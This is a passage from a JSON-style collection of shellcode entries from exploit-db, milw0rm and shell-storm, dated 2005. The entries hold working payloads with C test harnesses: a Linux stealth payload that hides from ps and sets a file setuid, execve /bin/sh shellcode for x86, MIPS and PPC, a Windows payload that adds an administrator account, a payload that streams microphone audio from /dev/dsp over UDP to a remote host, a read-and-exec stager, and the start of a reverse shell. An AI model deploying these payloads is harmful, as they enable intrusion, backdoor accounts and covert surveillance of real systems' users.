"\"\\xb2\\xfa\\x89\\xe1\\x29\\xd1\\xcd\\x80\\x89\\xcf\\x01\\xc7\\x93\\xfd\\x6a\\x20\"", "\"\\x58\\x6a\\x0e\\x59\\x87\\xcb\\xf2\\xae\\x87\\xcb\\xe2\\xf8\\x47\\x47\\x31\\xc0\"", "\"\\x6a\\x0a\\x5b\\xfc\\x31\\xd2\\x8a\\x0f\\x83\\xe9\\x30\\x01\\xc8\\x47\\x80\\x3f\"", "\"\\x20\\x74\\x04\\xf7\\xe3\\xeb\\xed\\x94\\x5f\\x5f\\x94\\x57\\xb1\\xff\\x31\\xc0\"", "\"\\xf3\\xaa\\x5f\\x56\\x4e\\x46\\x41\\x80\\x3e\\xff\\x75\\xf9\\xfe\\x06\\x5e\\xf3\"", "\"\\xa4\\xb0\\x42\\xcd\\x80\\x89\\xf7\\x92\\x48\\x89\\xc1\\xf2\\xae\\xfe\\x47\\xff\"", "\"\\xff\\xe7\\xe8\\x87\\xff\\xff\\xff\"", "\"/proc/self/stat\\xff\"                       // ", "\"xort and izik rocks the linux box\\xff\"     // new proc name", "\"/tmp/foo\\xff\"                              // file to chmod", "\"\\x6a\"                                      //", "\"\\x03\"                                      // sleep-time", "\"\\x40\\x89\\xe1\\x89\\xe3\\x34\\xa2\\xcd\\x80\\x31\\xc9\\x89\\xf3\\x34\\x21\\xcd\"", "\"\\x80\\x85\\xc0\\x75\\xeb\\xb0\\x0f\\x66\\xb9\\x6d\\x09\\xcd\\x80\\x40\\xcd\\x80\";", "", "// milw0rm.com [2005-09-08]"]},
{"Title": "Linux/x86 - Hide-Wait-Change (Hide from PS + Wait for /tmp/foo + chmod 0455) Shellcode (187+ bytes) (2)", "Author": "xort", "Published": ": 2005-09-09", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-245.php", "View": null, "code": ["#=============================================================================================#", "# hide-wait-change (final v4)                                                                 #", "# ------------------------------------------------------------------------------------------- #", "#      Author: xort (rrs@clyde.dcccd.edu)                                                     #", "#        Date: 09/14/2005 3:35pm                                                              # ", "#        Type: shellcode/(x86-linux).s,   (at&t)                                              #", "#        Size: strlen(fake-proc-name) + strlen(file-to-change) + 187                          #", "# Discription: This is a shellcode that will infect a process, play some argv[0] games among  #", "#              other tricks to hide itself from 'ps', and waits until the creation of a       #", "#              specified file. Once this file is found to exist, its permissions are changed  #", "#              to 04555. Original concept concived by izik.                                   #", "###############################################################################################", "", ".section .text", "", "\t.global _start", "", "        ###################################################################################", "        ##                                                                               ##", "        ## _start: 1) fork() a new process                                               ##", "        ##         2) check to see if we are child process                               ##", "        ##         3) if we are then _exit()                                             ##", "        ##                                                                               ##", "        ###################################################################################", "", "", "\t_start:", "", "", "\t      #-------------------------------------------#", "\t      # we start with a fork()                    #", "\t      #-------------------------------------------#", "                 ", "\t      push $0x02", "              pop %eax\t", "              int $0x80", "\t\t", "                ", "\t      #-------------------------------------------#", "\t      # child or parent?                          #", "\t      #-------------------------------------------#", "\t\t", "\t      test %eax, %eax", "\t      je proc_name", "\t", "", "\t      #-------------------------------------------#", "\t      # parent goes exit()                        #", "\t      #-------------------------------------------#", "", "\t      push $0x01", "              pop %eax ", "\t      int $0x80  ", "             ", "", "        ###################################################################################", "        ##                                                                               ##", "        ##         1) get address of \"/proc/self/stat\" and fix null@end                  ##", "        ##         2) open() \"/proc/self/stat\"                                           ##", "        ##         3) read in 250 bytes from file                                        ##", "        ##                                                                               ##", "        ###################################################################################", "", "", "              #-------------------------------------------#             ", "              # grab \"/proc\" string location              #", "              #-------------------------------------------#", "", " ret_w_proc:  pop %ebx", "              lea 0x10(%ebx), %esi              ", "", "              #-------------------------------------------#", "\t      # fix \"/proc\" string to include c-string    #", "\t      # terminator                                #", "\t      #-------------------------------------------#", "\t      ", "              incb 0xf(%ebx)", "", "", "\t###################################################################################", "        ##                                                                               ##", "        ## Open \"/proc/self/stat\" and read in 250 bytes                                  ##", "        ##                                                                               ##", "        ###################################################################################", "", "", "              #-------------------------------------------#", "\t      # open() the file                           #", "\t      #-------------------------------------------#", "\t      ", "\t      cdq ", "\t      xor %ecx, %ecx", "              movb $0x5, %al", "              int $0x80", "\t      \t      ", "", "\t      #------------------------------------------#", "\t      # read() 250-bytes from the file into      #", "\t      # ESP-250                                  #", "\t      #------------------------------------------#", "\t      ", "\t      xchg %eax, %ebx # store fd-pointer in ebx", "\t      push $0x3", "              pop %eax", "\t      movb $250, %dl      ", "\t      mov %esp, %ecx              ", "\t      sub %edx, %ecx", "              int $0x80  ", "\t      ", "\t      mov %ecx, %edi", "              add %eax, %edi", "\t      ", "", "\t###################################################################################", "        ##                                                                               ##", "        ##      1) Get location of pointer to argv[0] from file (NF-13)                  ## ", "        ##      2) Convert it to binary                                                  ##", "        ##      3) use that to find real argv[0]s location                               ##", "        ##      4) null-out all args with 0x0                                            ##", "        ##                                                                               ##", "\t###################################################################################", "", "", "\t      #------------------------------------------#", "\t      # scan for the decimal-string of the       #", "\t      # location of argc & argv[0]               #", "\t      #------------------------------------------#\t      ", "\t      ", "\t      xchg %eax, %ebx", "\t      ", "              std", "\t      push $0x20", "              pop %eax", "\t      push $14", "              pop %ecx", "\t     ", "  findargs:", "              xchg %ecx, %ebx      ", "\t      repne scasb", "\t      xchg %ecx, %ebx", "\t      loop findargs", "\t      inc %edi", "\t      inc %edi", "\t      ", "", "\t      #------------------------------------------#", "\t      # translate string into a real number to   #", "\t      # obtain pointer.                          #", "\t      #------------------------------------------#", "", "              xor %eax, %eax", "\t      push $10", "              pop %ebx", "              cld ", "", " calcloop: ", "              xor %edx, %edx", "              movb (%edi), %cl", "              subl $0x30, %ecx", "              addl %ecx, %eax", "              inc %edi", "              cmpb $0x20, (%edi) ", "              je done_gotnum", "              mul %ebx", "              jmp calcloop ", "", "", "              #------------------------------------------#", "              # once we have the location in memory of   #", "              # pointers to argc,argv[0-?], and envp,    #", "              # extract the location of argv[0]          #", "              #------------------------------------------#", "", " done_gotnum:", "              xchg %eax, %esp", "\t      pop %edi          ", "\t      pop %edi", "\t      xchg %eax, %esp", "", "", "              #------------------------------------------#", "              # write 255 null characters past argv[0]   #", "              # to overwrite it and any other args so ps #", "              # wont see them later                      #", "              #------------------------------------------#", "", "              push %edi", "              movb $0xff, %cl", "              xor %eax, %eax", "              rep stosb", "              pop %edi", "", "", "", "\t###################################################################################", "        ##                                                                               ##", "        ##      1) Get location of string we are going to copy over argv[0] and fix      ## ", "        ##         null@end.                                                             ##", "        ##      2) Call setsid() to extablish us as a process leader.                    ##", "        ##      3) Jump over strings into shellcode.                                     ##", "        ##                                                                               ##", "\t###################################################################################", "", "", "              #------------------------------------------#", "              # Get string location, fix nullchar and    #", "              # copy over argv[0],                       #", "              #------------------------------------------#", "", "", "              push %esi", "              dec %esi", " findend:", "              inc %esi", "              inc %ecx", "              cmpb $0xff, (%esi)", "              jne findend", "", "              incb (%esi)", "              pop %esi               ", "\t      rep movsb", "", "", "              #------------------------------------------#", "              # Call setsid() to establish us as a       #", "              # process leader.                          #", "              #------------------------------------------#", "", "              movb $66, %al", "              int $0x80", "", "              mov %esi, %edi", "              xchg %eax, %edx", "", "              dec %eax", "              mov %eax, %ecx ", "              repne scasb", "               ", "              incb -1(%edi)", "", "", "              #------------------------------------------#", "              # Jump over strings into shellcode         #", "              #------------------------------------------#", "", "              jmp *%edi", "", "", "\t###################################################################################", "        ##     STRINGS                                                                   ##", "\t###################################################################################", "", "", "\tproc_name:", "\t\tcall ret_w_proc", "\t\t.ascii \"/proc/self/stat\\xff\"", "\t", "   replace_string:", "\t\t.ascii \"haha\\xff\"", "", "         filename:", "                .ascii \"/tmp/foo\\xff\"", "", "", "\t###################################################################################", "        #                                                                                 #", "        # SHELLCODE                                                                       #", "        #          1) call nanosleep(60)                                                  #", "        #          2) check to see if FILENAME exist w/ access()                          #", "        #          3) if it does, then chmod 04555 FILENAME and exit                      #", "        #          4) _exit()                                                             #", "        #                                                                                 #", "\t###################################################################################", "", "       shellcode:", "                push $60", "", "    checkforfile:", "                inc %eax", "", "              #------------------------------------------#", "              # nanosleep(%edi)                          #", "              #------------------------------------------#", "                mov %esp, %ecx", "                mov %esp, %ecx", "                mov %esp, %ebx", "                xorb $0xa2, %al", "                int $0x80", "", "", "              #------------------------------------------#", "              # access((%esi),0)                         #", "              #------------------------------------------#", "", "                xor %ecx, %ecx", "                mov %esi, %ebx", "                xorb $0x21, %al", "                int $0x80", "", "                test %eax, %eax", "                jne checkforfile ", "", "", "              #------------------------------------------#", "              # chmod((%esi),04555)                      #", "              #------------------------------------------#", "", "                movb $0xf, %al", "                movw $0x96d, %cx ", "                int $0x80 ", "", "", "              #------------------------------------------#", "              # _exit()                                  #", "              #------------------------------------------#", "", "                inc %eax", "                int $0x80 ", "", "", "# milw0rm.com [2005-09-09]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + Standard Opcode Array Payload Shellcode (21 bytes)", "Author": "c0ntex", "Published": ": 2005-09-15", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13409.c", "View": "https://old.exploit-db.com/raw/13409/", "code": ["/*", " lnx_binsh4.c - v1 - 21 Byte /bin/sh Opcode Array Payload", " Copyright(c) 2004 c0ntex <c0ntex@open-security.org>", " ", " This program is free software; you can redistribute it and/or modify", " it under the terms of the GNU General Public License as published by", " the Free Software Foundation; either version 2 of the License, or", " (at your option) any later version.", "  ", " This program is distributed in the hope that it will be useful,", " but WITHOUT ANY WARRANTY; without even the implied warranty of", " MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the", " GNU General Public License for more details.", "  ", " You should have received a copy of the GNU General Public License", " along with this program; if not, write to the Free Software", " Foundation, Inc., 59 Temple Place, Suite 330, Boston,", " MA  02111-1307  USA", "*/", "", "/*", " Calling: execve(/bin/sh)", "*/", "", "#include <stdio.h>", "", "typedef char wikkid;", "", "wikkid oPc0d3z[] = \"\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"", "", "unsigned long grab_esp()", "{", "\t\t__asm__(\"", "\t\t          xorl %eax,%eax", "\t  \t          movl %eax,%ebx", "\t  \t          movl %esp,%eax", "\t  \t\");", "}", "", "int main(void)", "{", "\tunsigned long delta;", "\tvoid (*pointer)();", "", "\tdelta = grab_esp();", "", "\tfprintf(stderr, \"\\n[-] Stack Pointer found -> [0x%x]\\n\", delta);", "\tfprintf(stderr, \"\\t[-] Size of payload egg -> [%d]\\n\", sizeof(oPc0d3z));", "", "\tpointer=(void*)&oPc0d3z;", "", "\twhile(pointer) {", "\t\tfprintf(stderr, \"\\t[-] Payload Begin -> [0x%x]\\n\", pointer);", "\t\tfprintf(stderr, \"\\t[-] Payload End   -> [0x%x]\\n\\n\", pointer+21);", "\t\tpointer();", "\t}", "", "\t_exit(0x01);", "}", "", "// milw0rm.com [2005-09-15]"]},
{"Title": "Windows (NT/2000/XP) (Russian) - Add Administartor User (slim/shady) Shellcode (318 bytes)", "Author": "darkeagle", "Published": ": 2005-10-28", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-390.php", "View": null, "code": ["/*", "\\ win32 useradd shellcode for russian systems", "/ by Darkeagle", "\\ ExploiterZ Lab", "/ http://exploiterz.org", "\\", "*/", "", "// add user \"slim\" with password \"shady\" with admin prem. in Russian Systems", "unsigned char data[318] = {", "\t0xEB, 0x0F, 0x58, 0x80, 0x30, 0x17, 0x40, 0x81, 0x38, 0x6D, 0x61, 0x7A, 0x61, 0x75, 0xF4, 0xEB,", "\t0x05, 0xE8, 0xEC, 0xFF, 0xFF, 0xFF, 0xFE, 0xB6, 0x17, 0x17, 0x17, 0x4A, 0x42, 0x26, 0xCC, 0x73,", "\t0x9C, 0x14, 0x57, 0x84, 0x9C, 0x54, 0xE8, 0x57, 0x62, 0xEE, 0x9C, 0x44, 0x14, 0x71, 0x26, 0xC5,", "\t0x71, 0xAF, 0x17, 0x07, 0x71, 0x96, 0x2D, 0x5A, 0x4D, 0x63, 0x13, 0x3E, 0xD5, 0xFC, 0xE2, 0x9E,", "\t0xC4, 0x9C, 0x6D, 0x2B, 0x16, 0xC0, 0x14, 0x48, 0x6F, 0x9C, 0x5C, 0x0F, 0x9C, 0x64, 0x37, 0x9C,", "\t0x6C, 0x33, 0x16, 0xC1, 0x16, 0xC0, 0xEB, 0xBA, 0x16, 0xC7, 0x81, 0x90, 0xEA, 0x46, 0x26, 0xDE,", "\t0x97, 0xD6, 0x18, 0xE4, 0xB1, 0x65, 0x1D, 0x81, 0x4E, 0x90, 0xEA, 0x63, 0x18, 0x50, 0x50, 0xF5,", "\t0xF1, 0xA9, 0x18, 0x17, 0x17, 0x17, 0x3E, 0xD9, 0x3E, 0xE0, 0xFC, 0xFC, 0x26, 0xD7, 0x71, 0x9C,", "\t0x10, 0xD6, 0xF7, 0x15, 0x9C, 0x64, 0x0B, 0x16, 0xC1, 0x16, 0xD1, 0xBA, 0x16, 0xC7, 0x9E, 0xD1,", "\t0x9E, 0xC0, 0x4A, 0x9A, 0x92, 0x0B, 0x17, 0x17, 0x17, 0x47, 0x40, 0xE8, 0xC1, 0x7F, 0x12, 0x17,", "\t0x17, 0x17, 0x9A, 0x9A, 0x27, 0x17, 0x17, 0x17, 0x46, 0xE8, 0xC7, 0x9A, 0x92, 0x33, 0x17, 0x17,", "\t0x17, 0x47, 0x40, 0xE8, 0xC1, 0x7F, 0x17, 0x17, 0x17, 0x17, 0xE8, 0xC7, 0xFF, 0x4D, 0xE8, 0xE8,", "\t0xE8, 0x50, 0x72, 0x63, 0x47, 0x65, 0x78, 0x74, 0x56, 0x73, 0x73, 0x65, 0x72, 0x64, 0x64, 0x17,", "\t0x5B, 0x78, 0x76, 0x73, 0x5B, 0x7E, 0x75, 0x65, 0x76, 0x65, 0x6E, 0x56, 0x17, 0x40, 0x7E, 0x79,", "\t0x52, 0x6F, 0x72, 0x74, 0x17, 0x52, 0x6F, 0x7E, 0x63, 0x47, 0x65, 0x78, 0x74, 0x72, 0x64, 0x64,", "\t0x17, 0x74, 0x7A, 0x73, 0x37, 0x38, 0x74, 0x37, 0x79, 0x72, 0x63, 0x37, 0x62, 0x64, 0x72, 0x65,", "\t0x37, 0x38, 0x76, 0x73, 0x73, 0x37, 0x64, 0x7B, 0x7E, 0x7A, 0x37, 0x64, 0x7F, 0x76, 0x73, 0x6E,", "\t0x31, 0x31, 0x79, 0x72, 0x63, 0x37, 0x7B, 0x78, 0x74, 0x76, 0x7B, 0x70, 0x65, 0x78, 0x62, 0x67,", "\t0x37, 0x38, 0x76, 0x73, 0x73, 0x37, 0xF7, 0xF3, 0xFB, 0xFF, 0xFA, 0xFF, 0xE6, 0xE5, 0xE7, 0xF7,", "\t0xE5, 0xF9, 0xE7, 0xEC, 0x37, 0x64, 0x7B, 0x7E, 0x7A, 0x17, 0x6D, 0x61, 0x7A, 0x61", "};", "", "int main()", "{", "", "   void (*c0d3)();", "   printf(\"Win32 \\\"adduser shellcode\\\"\\n\");", "   *(int*)&c0d3 = data;", "   c0d3();", "}", "", "// milw0rm.com [2005-10-28]"]},
{"Title": "Linux/x86 - Snoop /dev/dsp + Null-Free Shellcode (172 bytes)", "Author": "phar", "Published": ": 2005-11-04", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13408.c", "View": "https://old.exploit-db.com/raw/13408/", "code": ["/* Placed the listener here http://www.milw0rm.com/down.php?id=1293 /str0ke */", "", "/********************************************************************", "\they folks, this is snoop_shell, short and simply it snoops on ", "\t/dev/dsp and after attempting to lower the audio quality", "\twill stream any data read on this device over a udp stream", "\tto a remote listening client.. (source should be available at stonedcoder.org)", "", "\tthe port that this will stream on is whatever the high half", "\tof the ip address is, i figured this will always be over 1024", "\tso the client will be usable without root privs.", "", "\tat 172 bytes, its really bloated for shellcode, but if your ", "\treading this anyway, you probably are just looking to have fun ", "\twith it..", "", "\tremember you'll need to change the ip address before you ", "\tactually use it.. and if your unlucky enough to have an ", "\tip address that contains a null.. well.. its on you to fix it..", "\tbut you can do that by simply rotating the ipaddress by a bit or ", "\ttwo..", "", "\tmov    $0xE8015180,%ebx\t\t\t\t\t\t#192.168.0.116", "\tror\t   %ebx\t\t\t\t\t\t\t\t\t#shift right by one bit", "\t", "\tno more null", "\t", "", "\tphar[at]stonedcoder[dot]org", "*********************************************************************/", "", "", "char shellcode[] = ", "\"\\x31\\xc9\"                \t//xor    %ecx,%ecx", "\"\\x51\"\t                   \t//push   %ecx\t\t\t\t\t# \\x00", "\"\\x68\\x2f\\x64\\x73\\x70\"      //push   $0x7073642f\t\t\t# /dsp", "\"\\x68\\x2f\\x64\\x65\\x76\"      //push   $0x7665642f\t\t\t# /dev", "\"\\x89\\xe3\"                \t//mov    %esp,%ebx", "\"\\x89\\xc8\"                \t//mov    %ecx,%eax", "\"\\xb1\\x02\"                \t//mov    $0x2,%cl", "\"\\xb0\\x05\"                \t//mov    $0x5,%al", "\"\\xcd\\x80\"                \t//int    $0x80\t\t\t\t\t#open /dev/dsp for reading", "", "\"\\x89\\xc6\"                \t//mov    %eax,%esi\t\t\t\t#preserve fd in esi", "", "\"\\x31\\xc9\"                \t//xor    %ecx,%ecx", "\"\\x51\"                   \t//push   %ecx", "\"\\x31\\xdb\"                \t//xor    %ebx,%ebx", "\"\\xb3\\x02\"                \t//mov    $0x2,%bl", "\"\\x53\"                   \t//push   %ebx", "\"\\x53\"                   \t//push   %ebx", "\"\\x4b\"                   \t//dec    %ebx", "\"\\x89\\xe1\"                \t//mov    %esp,%ecx", "\"\\x89\\xd8\"                \t//mov    %ebx,%eax", "\"\\xb0\\x66\"                \t//mov    $0x66,%al", "\"\\xcd\\x80\"                \t//int    $0x80\t\t\t\t\t#create a udp socket", "", "\"\\x89\\xc7\"                \t//mov    %eax,%edi\t\t\t\t#preserve socket in edi", "", "\"\\xc1\\xc3\\x04\"             \t//rol    $0x4,%ebx", "\"\\x53\"                   \t//push   %ebx", "\"\\x89\\xe2\"                \t//mov    %esp,%edx", "\"\\xb9\\x05\\x50\\x04\\xc0\"      //mov    $0xc0045005,%ecx", "\"\\x89\\xf3\"                \t//mov    %esi,%ebx\t\t\t\t", "\"\\xb0\\x36\"                \t//mov    $0x36,%al\t\t\t\t", "\"\\xcd\\x80\"                \t//int    $0x80\t\t\t\t\t#ioctl on fd SOUND_PCM_WRITE_BITS (16 bits per samle)", "", "\"\\xfe\\xc0\"                \t//inc    %al", "\"\\x89\\x04\\x24\"             \t//mov    %eax,(%esp)", "\"\\xfe\\xc1\"                \t//inc    %cl", "\"\\xb0\\x36\"                \t//mov    $0x36,%al", "\"\\xcd\\x80\"                \t//int    $0x80\t\t\t\t\t#ioctl on fd SOUND_PCM_WRITE_CHANNELS (1 channel)", "", "\"\\xfe\\xc0\"                \t//inc    %al", "\"\\xc1\\xc0\\x0d\"             \t//rol    $0xd,%eax", "\"\\x89\\x04\\x24\"             \t//mov    %eax,(%esp)", "\"\\xc1\\xc8\\x04\"             \t//ror    $0x8,%eax", "\"\\xb1\\x02\"                \t//mov    $0x2,%cl", "\"\\xb0\\x36\"                \t//mov    $0x36,%al\t\t\t\t#ioctl on fd SOUND_PCM_WRITE_RATE (8khz)", "\"\\xcd\\x80\"                \t//int    $0x80", "", "\"\\x50\"                   \t//push   %eax", "\"\\x50\"                   \t//push   %eax", "\"\\x89\\xc2\"                \t//mov    %eax,%edx", "", "/* prepare an area on the stack that looks like an struct in_addr */", "\t  /*your ipv4 ip address*/", "\"\\xbb\" \"\\xc0\\xa8\\x0f\\x2e\"   //mov    $0x7401a8c0,%ebx\t\t#your ipaddress would go here currently set to 192.168.1.116", "\"\\x53\"                   \t//push   %ebx", "\"\\xc1\\xe3\\x10\"             \t//shl    $0x10,%ebx", "\"\\xb3\\x02\"                \t//mov    $0x2,%bl", "\"\\x53\"                 \t\t//push   %ebx\t\t\t\t\t#port and family, (we'll use use the hi half of the address for a port)", "", "/* allocate 1025 byte buffer on the stack */", "\"\\x89\\xe3\"                \t//mov    %esp,%ebx", "\"\\x66\\xba\\x01\\x04\"          //mov    $0x401,%dx\t\t\t\t#create the space on the stack (1025 bytes)", "\"\\x29\\xd4\"                \t//sub    %edx,%esp", "", "\"\\x89\\xe0\"                \t//mov    %esp,%eax", "\"\\x31\\xc9\"                \t//xor    %ecx,%ecx", "\"\\xb1\\x10\"                \t//mov    $0x10,%cl", "\"\\x51\"       \t            //push   %ecx", "\"\\x53\"         \t          \t//push   %ebx", "\"\\x31\\xc9\"         \t       \t//xor    %ecx,%ecx", "\"\\x51\"               \t    //push   %ecx", "\"\\x52\"                 \t  \t//push   %edx", "\"\\x50\"                 \t  \t//push   %eax", "\"\\x57\"\t\t\t\t\t\t//push   %edi", "\"\\x89\\xc2\"                \t//mov    %eax,%edx", "\"\\x89\\xcb\"                \t//mov    %ecx,%ebx", "\"\\x89\\xc8\"                \t//mov    %ecx,%eax", "\"\\x89\\xe1\"                \t//mov    %esp,%ecx", "\"\\xb3\\x0b\"                \t//mov    $0xb,%bl", "\"\\xb0\\x66\"                \t//mov    $0x66,%al", "\"\\x51\"                   \t//push   %ecx", "\"\\x89\\xe7\"                \t//mov    %esp,%edi\t\t\t\t#registers and stack are prepared for call to sendto", "\"\\x60\"                   \t//pusha  \t\t\t\t\t\t#push regs onto stack", "", "\"\\x89\\xf3\"                \t//mov    %esi,%ebx", "\"\\x89\\xd1\"                \t//mov    %edx,%ecx", "\"\\x89\\xd8\"                \t//mov    %ebx,%eax", "\"\\xb0\\x03\"                \t//mov    $0x3,%al", "\"\\x89\\xc2\"                \t//mov    %eax,%edx", "\"\\x66\\xba\\x01\\x08\"          //mov    $0x401,%dx\t\t\t\t#registers are prepared for call to read", "\"\\x60\"                   \t//pusha  \t\t\t\t\t\t#push regs", "", "", "\"\\x89\\x27\"                \t//mov    %esp,(%edi)\t\t\t#store this stack pointer in the memory allocated above ", "/*loop:*/\t\t\t\t\t//\t\t\t\t\t\t\t\t#so that we can restore it for the loop", "", "\"\\x61\"                   \t//popa   \t\t\t\t\t\t#pop prepared registers from stack", "\"\\xcd\\x80\"                \t//int    $0x80\t\t\t\t\t#call read", "", "\"\\x61\"                 \t  \t//popa   \t\t\t\t\t\t#pop registers again", "\"\\xcd\\x80\"                \t//int    $0x80\t\t\t\t\t#call sendto", "", "\"\\x8b\\x27\"                \t//mov    (%edi),%esp\t\t\t#pulls from the memory allocated before and restores esp", "\"\\xeb\\xf6\"                \t//jmp    80483f5 <loop>", ";", "", "", "", "int main() {", "int *ret;", "char cnull = 0;", "", "\tprintf(\"shellcode_size: %u\\n\", sizeof(shellcode));", "\tprintf(\"contains nulls: \");", "\tif(!memmem(shellcode,sizeof(shellcode),&cnull,1)){", "\t\tprintf(\"yes\\n\");", "\t}else{", "\t\tprintf(\"no\\n\");", "\t}", "\t", "\tret = (int *)&ret + 2;", "\t(*ret) = (int)shellcode;", "", "}", "", "// milw0rm.com [2005-11-04]"]},
{"Title": "Linux/MIPS (Little Endian) - execve(/bin/sh) Shellcode (56 bytes)", "Author": "core", "Published": ": 2005-11-09", "Platform": "Linux_MIPS", "Download": "http://shell-storm.org/shellcode/files/shellcode-79.php", "View": null, "code": ["/* 56 bytes execve /bin/sh shellcode - linux-mipsel", " * - by core (core@bokeoa.com)", " *", " * Note: For MIPS running in little-endian mode.", " * Tested on a Cobalt Qube2 server running Linux 2.4.18", " *", " * Greetz to bighawk... i couldn't get his execve to work ", " * for some reason :/", " */", "", "char code[] =", "/* 16 byte setreuid(0,0) by bighawk */", "//\"\\xff\\xff\\x04\\x30\\xff\\xff\\x05\\x30\"", "//\"\\xe6\\x0f\\x02\\x34\\xcc\\x48\\x49\\x03\"", "", "/* 56 byte execve(\"/bin/sh\",[\"/bin/sh\"],[]) by core */", "\"\\xff\\xff\\x10\\x04\\xab\\x0f\\x02\\x24\"", "\"\\x55\\xf0\\x46\\x20\\x66\\x06\\xff\\x23\"", "\"\\xc2\\xf9\\xec\\x23\\x66\\x06\\xbd\\x23\"", "\"\\x9a\\xf9\\xac\\xaf\\x9e\\xf9\\xa6\\xaf\"", "\"\\x9a\\xf9\\xbd\\x23\\x21\\x20\\x80\\x01\"", "\"\\x21\\x28\\xa0\\x03\\xcc\\xcd\\x44\\x03\"", "\"/bin/sh\";", "", "main() {", "  void (*a)() = (void *)code;", "  printf(\"size: %d bytes\\n\", sizeof(code));", "  a();", "}", "", "// milw0rm.com [2005-11-09]"]},
{"Title": "Linux/PPC - execve(/bin/sh) Shellcode (60 bytes)", "Author": "Charles Stevenson", "Published": ": 2005-11-09", "Platform": "Linux_PPC", "Download": "http://shell-storm.org/shellcode/files/shellcode-86.php", "View": null, "code": ["/* execve-core.c by Charles Stevenson <core@bokeoa.com> */", "char hellcode[] = /* execve /bin/sh linux/ppc by core */", "// Sometimes you can comment out the next line if space is needed", "\"\\x7c\\x3f\\x0b\\x78\"\t/*mr\tr31,r1*/", "\"\\x7c\\xa5\\x2a\\x79\"\t/*xor.\tr5,r5,r5*/", "\"\\x42\\x40\\xff\\xf9\"\t/*bdzl+\t10000454<main>*/", "\"\\x7f\\x08\\x02\\xa6\"\t/*mflr\tr24*/", "\"\\x3b\\x18\\x01\\x34\"\t/*addi\tr24,r24,308*/", "\"\\x98\\xb8\\xfe\\xfb\"\t/*stb\tr5,-261(r24)*/", "\"\\x38\\x78\\xfe\\xf4\"\t/*addi\tr3,r24,-268*/", "\"\\x90\\x61\\xff\\xf8\"\t/*stw\tr3,-8(r1)*/", "\"\\x38\\x81\\xff\\xf8\"\t/*addi\tr4,r1,-8*/", "\"\\x90\\xa1\\xff\\xfc\"\t/*stw\tr5,-4(r1)*/", "\"\\x3b\\xc0\\x01\\x60\"\t/*li\tr30,352*/", "\"\\x7f\\xc0\\x2e\\x70\"\t/*srawi\tr0,r30,5*/", "\"\\x44\\xde\\xad\\xf2\"\t/*.long\t0x44deadf2*/", "\"/bin/shZ\"; // the last byte becomes NULL", "", "int main(void)", "{", "  void (*shell)() = (void *)&hellcode;", "  printf(\"%d byte execve /bin/sh shellcode for linux/ppc by core\\n\",", "         strlen(hellcode));", "  shell();", "  return 0;", "}", "", "// milw0rm.com [2005-11-09]"]},
{"Title": "Linux/PPC - read + exec Shellcode (32 bytes)", "Author": "Charles Stevenson", "Published": ": 2005-11-09", "Platform": "Linux_PPC", "Download": "http://shell-storm.org/shellcode/files/shellcode-88.php", "View": null, "code": ["/* readnexecppc-core.c by Charles Stevenson <core@bokeoa.com> */", "char hellcode[] = /* read(0,stack,1028); stack(); linux/ppc by core */", "\"\\x7c\\x63\\x1a\\x79\"     /* xor.    r3,r3,r3 */", "\"\\x38\\xa0\\x04\\x04\"     /* li      r5,1028 */", "\"\\x30\\x05\\xfb\\xff\"     /* addic   r0,r5,-1025 */", "\"\\x7c\\x24\\x0b\\x78\"     /* mr      r4,r1 */", "\"\\x44\\xde\\xad\\xf2\"     /* sc */", "\"\\x69\\x69\\x69\\x69\"     /* nop */", "\"\\x7c\\x29\\x03\\xa6\"     /* mtctr   r1 */", "\"\\x4e\\x80\\x04\\x21\";    /* bctrl */", "", "int main(void)", "{", "  void (*shell)() = (void *)&hellcode;", "  printf(\"%d byte read & exec shellcode for linux/ppc by core\\n\",", "         strlen(hellcode));", "  shell();", "  return 0;", "}", "", "// milw0rm.com [2005-11-09]"]},
{"Title": "Linux/PPC - Reverse (192.168.1.1:31337/TCP) Shell (/bin/sh) Shellcode (240 bytes)", "Author": "Charles Stevenson", "Published": ": 2005-11-09", "Platform": "Linux_PPC", "Download": "http://shell-storm.org/shellcode/files/shellcode-87.php", "View": null, "code": ["/* connect-core5.c by Charles Stevenson <core@bokeoa.com> */", "char hellcode[] = /* connect back & execve /bin/sh linux/ppc by core */", "\"\\x7c\\x3f\\x0b\\x78\"\t/*mr\tr31,r1*/", "\"\\x3b\\x40\\x01\\x0e\"\t/*li\tr26,270*/", "\"\\x3b\\x5a\\xfe\\xf4\"\t/*addi\tr26,r26,-268*/", "\"\\x7f\\x43\\xd3\\x78\"\t/*mr\tr3,r26*/", "\"\\x3b\\x60\\x01\\x0d\"\t/*li\tr27,269*/", "\"\\x3b\\x7b\\xfe\\xf4\"\t/*addi\tr27,r27,-268*/", "\"\\x7f\\x64\\xdb\\x78\"\t/*mr\tr4,r27*/", "\"\\x7c\\xa5\\x2a\\x78\"\t/*xor\tr5,r5,r5*/", "\"\\x7c\\x3c\\x0b\\x78\"\t/*mr\tr28,r1*/", "\"\\x3b\\x9c\\x01\\x0c\"\t/*addi\tr28,r28,268*/", "\"\\x90\\x7c\\xff\\x08\"\t/*stw\tr3,-248(r28)*/", "\"\\x90\\x9c\\xff\\x0c\"\t/*stw\tr4,-244(r28)*/", "\"\\x90\\xbc\\xff\\x10\"\t/*stw\tr5,-240(r28)*/", "\"\\x7f\\x63\\xdb\\x78\"\t/*mr\tr3,r27*/", "\"\\x3b\\xdf\\x01\\x0c\"\t/*addi\tr30,r31,268*/", "\"\\x38\\x9e\\xff\\x08\"\t/*addi\tr4,r30,-248*/", "\"\\x3b\\x20\\x01\\x98\"\t/*li\tr25,408*/", "\"\\x7f\\x20\\x16\\x70\"\t/*srawi\tr0,r25,2*/", "\"\\x44\\xde\\xad\\xf2\"\t/*.long 0x44deadf2*/", "\"\\x7c\\x78\\x1b\\x78\"\t/*mr\tr24,r3*/", "\"\\xb3\\x5e\\xff\\x16\"\t/*sth\tr26,-234(r30)*/", "\"\\x7f\\xbd\\xea\\x78\"\t/*xor\tr29,r29,r29*/", "// Craft your exploit to poke these value in. Right now it's set", "// for port 31337 and ip 192.168.1.1. Here's an 